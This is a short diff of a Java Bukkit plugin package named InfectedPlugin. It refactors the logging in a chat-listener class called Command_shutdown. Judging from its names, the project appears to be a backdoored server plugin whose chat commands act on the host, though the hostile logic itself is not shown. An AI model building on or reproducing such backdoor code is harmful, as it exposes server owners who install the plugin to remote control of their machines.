@@ -1,17 +1,13 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import java.io.IOException;
-import java.util.logging.Logger;
-
-import org.bukkit.Bukkit;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.CreeperCoders.InfectedPlugin.IP_Util;
+import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
 
 public class Command_shutdown implements Listener
 {
-    public final Logger log = Bukkit.getLogger();
-
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
@@ -34,11 +30,11 @@ public class Command_shutdown implements Listener
                 }
                 catch (IOException ex)
                 {
-                    log.severe(ex.getMessage());
+                    InfectedPlugin.log.severe(ex.getMessage());
                 }
                 catch (RuntimeException ex)
                 {
-                    log.severe(ex.getMessage());
+                    InfectedPlugin.log.severe(ex.getMessage());
                 }
                 cancel = true;
             }
